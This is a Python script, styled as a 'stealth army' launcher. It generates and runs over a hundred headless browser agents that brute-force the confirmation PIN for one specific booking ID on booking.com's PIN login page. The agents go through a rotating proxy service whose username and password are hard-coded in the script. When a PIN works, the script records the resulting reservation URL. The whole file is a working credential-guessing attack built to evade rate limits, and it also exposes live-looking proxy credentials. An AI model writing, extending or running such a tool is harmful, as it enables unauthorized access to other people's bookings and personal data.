#!/usr/bin/env python3
"""
⚡ STEALTH ARMY LAUNCHER - Maximum Efficiency 
Uses headless browsers for minimal RAM usage
2 Batches of 53 agents each for optimal performance
"""

import subprocess
import os
import time
import sys
import psutil
from pathlib import Path
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

# Configuration
BOOKING_ID = "5724349472"
PYTHON_PATH = sys.executable
BASE_DIR = Path(".")
MAX_AGENTS = 106

# Custom batch size: 2 batches of 53 agents each
STEALTH_BATCH_SIZE = 53  # Exactly 53 headless browsers per batch

# System info
TOTAL_RAM_GB = psutil.virtual_memory().total / (1024**3)
AVAILABLE_RAM_GB = psutil.virtual_memory().available / (1024**3)

def display_stealth_banner():
    """Display the stealth deployment banner"""
    banner = f"""
{Fore.GREEN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                    ⚡ STEALTH ARMY - 2 BATCH STRATEGY ⚡                     ║
║                                                                              ║
║  🥷 STEALTH MODE:                                                            ║
║     • Headless browsers (invisible)                                         ║
║     • ~50MB RAM per browser (vs 250MB)                                      ║
║     • {STEALTH_BATCH_SIZE} agents per batch (2 batches total)                        ║
║     • Ultra-fast deployment                                                 ║
║                                                                              ║
║  📊 YOUR SYSTEM:                                                             ║
║     • Total RAM: {TOTAL_RAM_GB:.1f} GB                                                   ║
║     • Available: {AVAILABLE_RAM_GB:.1f} GB                                               ║
║     • Batch 1 usage: ~{STEALTH_BATCH_SIZE * 0.05:.1f} GB (53 browsers)                       ║
║     • Batch 2 usage: ~{(106-STEALTH_BATCH_SIZE) * 0.05:.1f} GB ({106-STEALTH_BATCH_SIZE} browsers)                    ║
║                                                                              ║
║                      🚀 STEALTH DEPLOYMENT READY! 🚀                        ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(banner)

def create_stealth_agent_launcher():
    """Create a stealth version of agents that run headless"""
    stealth_script = f'''#!/usr/bin/env python3
"""
🥷 STEALTH RAPID-FIRE AGENT - Headless & Fast
Tests PINs with minimal resource usage
"""

from playwright.sync_api import sync_playwright
import sys
import time
from datetime import datetime

# Get PIN from command line
if len(sys.argv) != 2:
    print("Usage: python stealth_agent.py <PIN>")
    sys.exit(1)

ASSIGNED_PIN = sys.argv[1]
BOOKING_ID = "{BOOKING_ID}"

# Lightweight proxy configuration
PROXY_CONFIG = {{
    "server": "http://pr.oxylabs.io:7777",
    "username": "customer-1proxylabs_atNPR-cc-us",
    "password": "1proxylabs_atNPR1"
}}

def test_pin_stealth():
    """Ultra-lightweight PIN testing"""
    try:
        with sync_playwright() as p:
            # Launch headless browser (much less RAM)
            browser = p.chromium.launch(
                headless=True,  # Invisible = less RAM
                proxy=PROXY_CONFIG,
                args=['--no-sandbox', '--disable-dev-shm-usage']  # Extra memory savings
            )
            page = browser.new_page()
            
            # Navigate and test
            page.goto("https://secure.booking.com/help/confirmation_pin_auth", 
                     wait_until="load", timeout=20000)
            
            page.wait_for_selector('input[placeholder="e.g. 1234567890"]', timeout=10000)
            page.fill('input[placeholder="e.g. 1234567890"]', BOOKING_ID)
            page.fill('input[placeholder="e.g. 1234"]', ASSIGNED_PIN)
            
            # Submit
            try:
                page.click('button:has-text("Continue")')
            except:
                page.click('button[type="submit"]')
            
            # Wait for result
            page.wait_for_function(
                '''() => location.href.includes('unique_order_id') || 
                        document.querySelector('.bui-alert--error') !== null''',
                timeout=20000
            )
            
            current_url = page.url
            
            if "unique_order_id=" in current_url:
                # SUCCESS!
                success_msg = f"STEALTH_SUCCESS|PIN_{{ASSIGNED_PIN}}|{{current_url}}|{{datetime.now()}}"
                print(success_msg)
                
                # Write success file
                with open("STEALTH_SUCCESS.txt", "w") as f:
                    f.write(success_msg)
                
                browser.close()
                return True
            else:
                print(f"STEALTH_FAIL|PIN_{{ASSIGNED_PIN}}")
                browser.close()
                return False
                
    except Exception as e:
        print(f"STEALTH_ERROR|PIN_{{ASSIGNED_PIN}}|{{str(e)}}")
        return False

if __name__ == "__main__":
    result = test_pin_stealth()
    sys.exit(0 if result else 1)
'''
    
    with open("stealth_agent.py", "w", encoding="utf-8") as f:
        f.write(stealth_script)
    
    print(f"{Fore.GREEN}✅ Stealth agent script created{Style.RESET_ALL}")

def launch_stealth_batch(pin_list, batch_num):
    """Launch a batch of stealth agents"""
    processes = []
    
    print(f"\n{Fore.YELLOW}🥷 Launching stealth batch #{batch_num}: {len(pin_list)} agents{Style.RESET_ALL}")
    
    for i, pin in enumerate(pin_list, 1):
        try:
            process = subprocess.Popen(
                [PYTHON_PATH, "stealth_agent.py", pin],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            processes.append((pin, process))
            print(f"{Fore.GREEN}✅ Agent #{i:02d} PIN {pin}: Launched{Style.RESET_ALL}")
            time.sleep(0.3)  # Small delay to prevent overwhelming
            
        except Exception as e:
            print(f"{Fore.RED}❌ Agent PIN {pin}: Failed - {e}{Style.RESET_ALL}")
    
    return processes

def monitor_stealth_batch(processes, batch_num):
    """Monitor stealth batch for results"""
    print(f"\n{Fore.CYAN}🔍 Monitoring Batch #{batch_num} ({len(processes)} stealth agents)...{Style.RESET_ALL}")
    
    completed = 0
    success_found = False
    
    while completed < len(processes) and not success_found:
        # Check for success file
        success_file = BASE_DIR / "STEALTH_SUCCESS.txt"
        if success_file.exists():
            print(f"\n{Fore.GREEN}{Style.BRIGHT}🎉 STEALTH SUCCESS DETECTED IN BATCH #{batch_num}!{Style.RESET_ALL}")
            success_found = True
            break
        
        # Check individual processes
        for i, (pin, process) in enumerate(processes):
            if process and process.poll() is not None:
                stdout, stderr = process.communicate()
                completed += 1
                
                if "STEALTH_SUCCESS" in stdout:
                    success_found = True
                    print(f"\n{Fore.GREEN}{Style.BRIGHT}🎉 Stealth Agent PIN {pin} FOUND SUCCESS!{Style.RESET_ALL}")
                    break
                elif "STEALTH_FAIL" in stdout:
                    print(f"{Fore.BLUE}Agent PIN {pin}: Failed{Style.RESET_ALL}")
                elif "STEALTH_ERROR" in stdout:
                    print(f"{Fore.RED}Agent PIN {pin}: Error{Style.RESET_ALL}")
                
                processes[i] = (pin, None)
        
        if not success_found:
            # Show progress
            active_agents = len([p for _, p in processes if p and p.poll() is None])
            print(f"{Fore.CYAN}📊 Batch #{batch_num}: {completed}/{len(processes)} complete, {active_agents} active{Style.RESET_ALL}")
            time.sleep(2)  # Check every 2 seconds
    
    # Terminate remaining processes in this batch
    terminated_count = 0
    for pin, process in processes:
        if process and process.poll() is None:
            try:
                process.terminate()
                terminated_count += 1
            except:
                pass
    
    if terminated_count > 0:
        print(f"{Fore.YELLOW}🛑 Terminated {terminated_count} remaining agents in Batch #{batch_num}{Style.RESET_ALL}")
    
    return success_found

def main():
    """Main stealth deployment"""
    display_stealth_banner()
    
    # Get all PINs from agent folders
    pin_list = []
    for i in range(1, MAX_AGENTS + 1):
        agent_dir = BASE_DIR / f"agent_{i:03d}"
        main_py_path = agent_dir / "main.py"
        
        if main_py_path.exists():
            try:
                with open(main_py_path, "r", encoding="utf-8") as f:
                    content = f.read()
                    for line in content.split('\n'):
                        if line.strip().startswith('ASSIGNED_PIN = "'):
                            pin = line.strip().split('"')[1]
                            pin_list.append(pin)
                            break
            except:
                pass
    
    print(f"{Fore.CYAN}📋 STEALTH DEPLOYMENT PLAN:")
    print(f"   • Total PINs to test: {len(pin_list)}")
    print(f"   • Batch 1: {STEALTH_BATCH_SIZE} agents (PINs 1-53)")
    print(f"   • Batch 2: {len(pin_list)-STEALTH_BATCH_SIZE} agents (PINs 54-{len(pin_list)})")
    print(f"   • Estimated RAM per batch: ~{STEALTH_BATCH_SIZE * 0.05:.1f} GB")
    print(f"   • Mode: Headless (invisible browsers){Style.RESET_ALL}")
    
    input(f"\n{Fore.CYAN}Press ENTER to deploy the 2-batch stealth army...{Style.RESET_ALL}")
    
    # Create stealth agent
    create_stealth_agent_launcher()
    
    # Create exactly 2 batches
    batch_1 = pin_list[:STEALTH_BATCH_SIZE]  # First 53 PINs
    batch_2 = pin_list[STEALTH_BATCH_SIZE:]  # Remaining PINs
    batches = [batch_1, batch_2]
    
    print(f"\n{Fore.GREEN}🥷 DEPLOYING 2-BATCH STEALTH ARMY...{Style.RESET_ALL}")
    start_time = time.time()
    
    for batch_num, pin_batch in enumerate(batches, 1):
        batch_info = f"Agents 1-53" if batch_num == 1 else f"Agents 54-{len(pin_list)}"
        print(f"\n{Fore.MAGENTA}{'='*70}")
        print(f"🥷 STEALTH BATCH #{batch_num}/2 ({batch_info}) - {len(pin_batch)} PINs")
        print(f"{'='*70}{Style.RESET_ALL}")
        
        # Show system status before batch
        ram_percent = psutil.virtual_memory().percent
        print(f"{Fore.CYAN}💻 Pre-batch RAM usage: {ram_percent:.1f}%{Style.RESET_ALL}")
        
        # Launch stealth batch
        batch_processes = launch_stealth_batch(pin_batch, batch_num)
        
        if not batch_processes:
            print(f"{Fore.RED}❌ Batch #{batch_num}: No agents launched{Style.RESET_ALL}")
            continue
        
        # Monitor for success
        success_found = monitor_stealth_batch(batch_processes, batch_num)
        
        if success_found:
            print(f"\n{Fore.GREEN}{Style.BRIGHT}🏆 STEALTH MISSION ACCOMPLISHED!{Style.RESET_ALL}")
            break
        
        # Brief pause and RAM check between batches
        if batch_num < len(batches):
            print(f"\n{Fore.CYAN}⏳ Batch #{batch_num} complete. Preparing Batch #{batch_num+1}...{Style.RESET_ALL}")
            ram_percent = psutil.virtual_memory().percent
            print(f"{Fore.CYAN}💻 Post-batch RAM usage: {ram_percent:.1f}%{Style.RESET_ALL}")
            time.sleep(3)  # Brief pause between batches
    
    # Final results
    end_time = time.time()
    total_time = end_time - start_time
    
    success_file = BASE_DIR / "STEALTH_SUCCESS.txt"
    if success_file.exists():
        try:
            with open(success_file, "r") as f:
                success_data = f.read().strip()
            
            victory_banner = f"""
{Fore.GREEN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                    🎉 STEALTH ARMY MISSION ACCOMPLISHED! 🎉                 ║
║                                                                              ║
║  📊 Success Details: {success_data[:50]}...               ║
║  ⏱️  Total Time: {total_time:.1f} seconds                                         ║
║  🥷 Strategy: 2-batch stealth deployment                                    ║
║  💻 Final RAM: {psutil.virtual_memory().percent:.1f}%                                       ║
║                                                                              ║
║                     🏆 STEALTH VICTORY ACHIEVED! 🏆                         ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
            print(victory_banner)
        except:
            print(f"\n{Fore.GREEN}🎉 STEALTH SUCCESS! Check STEALTH_SUCCESS.txt{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.YELLOW}🥷 2-batch stealth deployment complete - no success found{Style.RESET_ALL}")
        print(f"Total time: {total_time:.1f} seconds")
    
    # Final system status
    final_ram = psutil.virtual_memory().percent
    print(f"\n{Fore.CYAN}📊 FINAL STEALTH STATS:")
    print(f"• Total time: {total_time:.1f} seconds")
    print(f"• PINs tested: {len(pin_list)}")
    print(f"• Batches deployed: 2")
    print(f"• Final RAM usage: {final_ram:.1f}%")
    print(f"• System status: {'✅ Excellent' if final_ram < 70 else '⚠️ High usage'}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
